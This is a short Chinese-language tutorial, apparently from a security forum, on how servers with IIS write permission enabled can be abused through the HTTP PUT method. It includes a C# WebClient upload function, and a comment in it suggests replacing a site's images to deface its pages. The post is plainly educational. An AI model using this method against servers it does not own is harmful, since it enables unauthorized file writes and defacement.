
# HTTP PUT 上传文件

> 原文：[`www.pediy.com/kssd/pediy12/114878.html`](https://www.pediy.com/kssd/pediy12/114878.html)

## 作者

`ssLong`

## 背景

由于种种原因，开始学习 web 安全，初来乍到，所以是个不能再菜的菜鸟，但是看到看雪有这个模块，手也是很痒，所以想写点东西，与大家探讨学习...希望高人们指教，感激不尽!

上传文件漏洞，对于一个安全爱好者来说都不会陌生，一般指网站中有上传功能的地方，没有对上传文件的格式进行限制（更准确点说，没有采用允许上传文件类型的策略，而是采用禁止上传文件类型的方法，让攻击者有机可乘）。然而我说的这个可以上传文件的方法主要不是指这个，而是 `http put` 方法上传文件。

大家都知道，web 使用的是应用层的 `http` 协议，然而 `http` 协议有很多方法，比如常用的 `get`、`post` 等常用的提交表单方法，然而 `http` 还有很多不常用的方法，`put` 就是其中之一，可以实现上传文件功能。但是需要服务器开启该功能。这里我拿 `IIS` 服务器为例。

## 开启 IIS 的 PUT 方法

首先开启 `IIS` 使用 `put` 方法上传文件的功能：选中 `IIS` 下 网站 右键 属性 主目录 本地路径下的 写入 选项 即 如图所示：

这样这个 web 服务器就可以使用 `http put` 方法进行上传文件了！

## C# 实现

直接使用 `C#` 下的 `WebClient` 可以很方便的实现 `http put` 方法，具体代码如下

```csharp
/// <summary>
/// PUT 方法只要开启写入就可以上传文件 txt/html/gif /php 等图片（不能 asp/aspx/shtm/cer/asa/stm/
/// 因此当网站提供 IIS 写入功能可以上传 gif 等文件然后替换原来的图片达到修改页面的目的
/// </summary>
/// <param name="url"></param>
/// <param name="local"></param>
/// <returns></returns>
public static bool UpLoadFile(String url, String local)
{
    try
    {
        System.Net.WebClient myWebClient = new System.Net.WebClient();
        byte[] ret = myWebClient.UploadFile(url, "PUT", local);
        String strMessage = Encoding.ASCII.GetString(ret, 0, ret.Length);
        MessageBox.Show(strMessage);
    }
    catch (Exception exp)
    {
        MessageBox.Show(exp.Message);
        return false;
    }
    return true;
}
```

具体程序见附件。

## 附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) | `CheckWeb.rar` |
| --- | --- |
